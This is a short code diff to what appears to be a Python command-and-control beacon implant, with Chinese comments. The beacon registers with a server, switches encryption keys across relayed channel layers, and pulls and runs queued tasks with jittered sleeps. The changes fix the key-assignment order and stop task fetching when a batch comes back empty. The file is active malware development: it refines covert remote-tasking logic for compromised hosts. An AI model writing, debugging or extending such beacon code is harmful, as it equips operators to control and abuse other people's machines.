@@ -172,10 +172,10 @@ def sleep_jitter():
 
 def cycle():
     global CONN_KEY
-    CONN_KEY = _CK   # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥(_disp 设置)
     conn = None
     try:
-        conn = _T()
+        conn = _T()          # 可能更新 _CK(_disp 连接成功设置层密钥)
+        CONN_KEY = _CK       # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥
         send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True}).encode())
         while True:
             msg = js.loads(recv_frame(conn).decode())
@@ -197,13 +197,15 @@ def cycle():
                 return
             else:
                 return
-        # ② 请求并领取全部待执行任务(TASKS 帧可能多批,直到 PONG 断开)
+        # ② 请求并领取全部待执行任务(TASKS 帧可能多批,空批或 PONG 即取完)
         send_frame(conn, js.dumps({"type": "fetch"}).encode())
         while True:
             msg = js.loads(recv_frame(conn).decode())
             mtype = msg.get("type")
             if mtype == "tasks":
                 _handle_tasks(msg)
+                if not msg.get("tasks"):
+                    break  # 空批 = 取完(agent 一问一答模式下 server 无更多任务)
             elif mtype in ("pong", "error"):
                 break
     except Exception:
